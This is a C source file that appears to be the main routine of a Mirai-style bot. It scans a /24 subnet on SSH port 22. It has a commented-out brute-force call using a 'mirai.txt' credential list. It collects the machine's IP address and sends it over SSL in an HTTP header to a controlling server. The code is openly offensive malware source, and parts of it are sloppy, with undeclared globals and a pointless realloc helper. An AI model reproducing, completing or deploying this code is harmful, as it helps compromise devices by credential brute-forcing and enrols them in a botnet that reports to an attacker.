
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/time.h>
#include <stdlib.h>
#include <memory.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <stdarg.h>

#include <openssl/crypto.h>
#include <openssl/x509.h>
#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <libssh/libssh.h>
#include <assert.h>
#include <unistd.h>

#include "infograb.h"
#include "socketutils.h"
#include "SSLutils.h"
#include "brute.h"
#include "scanner.h"
#define SERVERREPLY 10000
#define INFOMAX 1000



char hostname[] = "127.0.0.1";


void decrease(char* data)
{
    data = realloc(data, 44 * sizeof(char));
}

int main(int argc, char* argv[]) { 
    char* target = "192.168.1.255";
    //brute_auth("mirai.txt", target);
    range_scanner(target, 24, 22);
     init_SSL_params();
    int socket_desc = socket(AF_INET, SOCK_STREAM, 0);
    char ip[INFOMAX];
    grab_net_info(ip);
    printf("ip address: %s\n", ip);

    if (socket_desc == -1) { 
        printf("could not create socket...\n");
        exit(-1);
    }
    /*
    else if (errno == EACCES) { 
        printf("please run as root...\n");
        exit(-1);
    }
    */

    printf("socket created...\n");
    printf("connecting....\n");
    if (can_connect(socket_desc, hostname)) { 
        printf("connected...\n");
    }

      
    if(SSL_library_init() < 0){
        BIO_printf(outbio, "Could not initialize the OpenSSL library !\n");
    }

    outbio    = BIO_new(BIO_s_file());
    outbio    = BIO_new_fp(stdout, BIO_NOCLOSE);

    method = SSLv23_client_method();
    ctx = SSL_CTX_new(method);
    SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2);

    ssl = SSL_new(ctx); 
    SSL_set_fd(ssl, socket_desc);
    

    SSL_connect(ssl);
  

     printf("SSL_get_peer_certificate(ssl) \n");
     cert = SSL_get_peer_certificate(ssl);
     if (cert == NULL)
         printf("Error: Could not get a certificate from: %s.\n", dest_url);
       else
         printf("Retrieved the server's certificate from: %s.\n", dest_url);

       printf("\n");
     certname = X509_NAME_new();
     certname = X509_get_subject_name(cert);

    char message[SERVERREPLY];
    //printf("ip is: %s\n", ip);
    req = "GET / HTTP/1.1\r\nHost: dybuk\r\ndata:";  
    strncpy(message, req, sizeof(message));
    strcat(message, ip);
    strcat(message, "\r\n\r\n");  
    req_len = strlen(message);
    printf("message: %s\n", message);
    SSL_write(ssl, message, req_len);

    memset(buf, '\0', sizeof(buf));
    bytes = SSL_read(ssl, buf, sizeof(buf));
    while(bytes > 0){
        write(STDOUT_FILENO, buf, bytes);
        memset(buf, '\0', sizeof(buf));
        bytes = SSL_read(ssl, buf, sizeof(buf));
    }
    SSL_free(ssl);
    close(socket_desc);
    SSL_CTX_free(ctx);


    return 0;
}